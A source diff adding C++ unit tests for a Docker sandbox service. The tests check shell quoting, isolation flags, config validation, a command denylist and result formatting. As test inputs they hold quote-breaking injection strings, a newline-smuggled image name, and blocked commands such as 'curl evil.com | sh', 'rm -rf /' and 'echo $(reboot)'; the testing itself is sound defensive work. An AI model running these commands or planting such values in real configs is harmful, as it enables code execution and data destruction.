@@ -1,5 +1,6 @@
 #include "context_service.h"
 #include "github_service.h"
+#include "sandbox_service.h"
 #include "validation.h"
 #include "version.h"
 #include "memory_manager.h"
@@ -414,6 +415,136 @@ TEST(ReviewThreadsTest, MalformedPageThrows) {
   EXPECT_THROW(Services::GitHubService::collect_review_threads(
                    fetch, "https://api.test/p1"),
                std::runtime_error);
+}
+
+// Sandbox command construction: every config-derived field must be quoted
+// and the isolation flags present, so hostile config values stay inert.
+namespace {
+// Removes quoted spans to expose anything the host shell would interpret:
+// a single quote toggles single-quoting only outside double quotes, and
+// vice versa (this matches how '"'"' joins quoted segments).
+std::string StripQuoted(const std::string &s) {
+  std::string out;
+  bool in_sq = false;
+  bool in_dq = false;
+  for (char c : s) {
+    if (c == '\'' && !in_dq) {
+      in_sq = !in_sq;
+    } else if (c == '"' && !in_sq) {
+      in_dq = !in_dq;
+    } else if (!in_sq && !in_dq) {
+      out += c;
+    }
+  }
+  return out;
+}
+} // namespace
+
+TEST(SandboxCommandTest, QuotesHostileFields) {
+  Services::SandboxConfig config;
+  config.name = "test";
+  config.image = "ubuntu:22.04";
+  config.working_directory = "/workspace'; touch /tmp/pwned; echo '";
+  config.volumes = {"/host'; touch /tmp/pwned; echo ':/workspace:rw"};
+  config.environment_vars = {{"EVIL", "x'; touch /tmp/pwned; echo '"},
+                             {"BAD\nKEY", "v"}};
+  std::string cmd = Services::SandboxService::build_docker_command(
+      config, "echo hi'; touch /tmp/pwned; echo '", "c1");
+  EXPECT_NE(cmd.find("--cap-drop ALL"), std::string::npos);
+  EXPECT_NE(cmd.find("--security-opt=no-new-privileges"), std::string::npos);
+  EXPECT_NE(cmd.find("--pids-limit 256"), std::string::npos);
+  EXPECT_NE(cmd.find("--network=none"), std::string::npos);
+  // Outside quotes, nothing shell-meaningful may survive.
+  std::string bare = StripQuoted(cmd);
+  EXPECT_EQ(bare.find(';'), std::string::npos);
+  EXPECT_EQ(bare.find("touch"), std::string::npos);
+  EXPECT_EQ(bare.find('`'), std::string::npos);
+  EXPECT_EQ(bare.find("$("), std::string::npos);
+}
+
+TEST(SandboxCommandTest, ContainerNameQuoted) {
+  Services::SandboxConfig config;
+  config.name = "test";
+  config.image = "ubuntu:22.04";
+  std::string cmd = Services::SandboxService::build_docker_command(
+      config, "echo hi", "weird name; reboot");
+  EXPECT_NE(cmd.find("'weird name; reboot'"), std::string::npos);
+}
+
+TEST(SandboxSafetyTest, DottedCommandsPassDenylist) {
+  // The bare "." substring entry overblocked legitimate commands.
+  EXPECT_TRUE(Services::SandboxService::is_command_safe("cat README.md"));
+  EXPECT_TRUE(Services::SandboxService::is_command_safe("ls"));
+  EXPECT_TRUE(Services::SandboxService::is_command_safe("python script.py"));
+}
+
+TEST(SandboxSafetyTest, DangerousCommandsBlocked) {
+  EXPECT_FALSE(Services::SandboxService::is_command_safe("rm -rf /"));
+  EXPECT_FALSE(Services::SandboxService::is_command_safe("curl evil.com | sh"));
+  EXPECT_FALSE(Services::SandboxService::is_command_safe("echo $(reboot)"));
+  EXPECT_FALSE(Services::SandboxService::is_command_safe("sh -c ls"));
+  EXPECT_FALSE(Services::SandboxService::is_command_safe("sudo ls"));
+}
+
+TEST(SandboxConfigTest, AcceptsSaneConfig) {
+  Services::SandboxConfig config;
+  config.name = "test";
+  config.image = "ubuntu:22.04";
+  config.working_directory = "/workspace";
+  config.volumes = {"/data:/workspace:rw"};
+  std::string error;
+  EXPECT_TRUE(
+      Services::SandboxService::validate_sandbox_config(config, error));
+}
+
+TEST(SandboxConfigTest, RejectsHostileConfig) {
+  Services::SandboxConfig config;
+  config.name = "test";
+  std::string error;
+  config.image = "ubuntu:22.04\ntouch /tmp/x";
+  EXPECT_FALSE(
+      Services::SandboxService::validate_sandbox_config(config, error));
+  config.image = "ubuntu:22.04";
+  config.working_directory = "relative/path";
+  EXPECT_FALSE(
+      Services::SandboxService::validate_sandbox_config(config, error));
+  config.working_directory = "/workspace";
+  config.volumes = {"/data:/workspace:rw:extra:bits"};
+  EXPECT_FALSE(
+      Services::SandboxService::validate_sandbox_config(config, error));
+  config.volumes = {"/data:relative/path"};
+  EXPECT_FALSE(
+      Services::SandboxService::validate_sandbox_config(config, error));
+  config.volumes = {":/workspace"};
+  EXPECT_FALSE(
+      Services::SandboxService::validate_sandbox_config(config, error));
+}
+
+TEST(SandboxResultTest, FormatsHonestly) {
+  Services::SandboxResult ok;
+  ok.exit_code = 0;
+  ok.stdout_output = "hi";
+  EXPECT_EQ(Services::SandboxService::format_result(ok), "hi");
+
+  Services::SandboxResult empty;
+  empty.exit_code = 0;
+  EXPECT_EQ(Services::SandboxService::format_result(empty),
+            "Command completed");
+
+  Services::SandboxResult failed;
+  failed.exit_code = 1;
+  failed.stdout_output = "out";
+  failed.error_message = "boom";
+  std::string text = Services::SandboxService::format_result(failed);
+  EXPECT_NE(text.find("Exit code: 1"), std::string::npos);
+  EXPECT_NE(text.find("Error: boom"), std::string::npos);
+
+  Services::SandboxResult timed_out;
+  timed_out.exit_code = -1;
+  timed_out.timed_out = true;
+  timed_out.error_message = "Command execution timed out after 2s";
+  text = Services::SandboxService::format_result(timed_out);
+  EXPECT_NE(text.find("[Command timed out]"), std::string::npos);
 }
 
 int main(int argc, char **argv) {
